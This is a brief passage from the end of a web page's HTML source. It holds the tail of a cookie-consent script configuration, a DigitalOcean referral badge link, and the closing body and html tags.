    "dismiss": "Got it!",
    "deny": "Refuse Cookies"
  }
});
</script>
<a href="https://www.digitalocean.com/?refcode=4026be10dd87&utm_campaign=Referral_Invite&utm_medium=Referral_Program&utm_source=badge"><img src="https://web-platforms.sfo2.cdn.digitaloceanspaces.com/WWW/Badge%201.svg" alt="DigitalOcean Referral Badge" /></a>

</body>
</html>
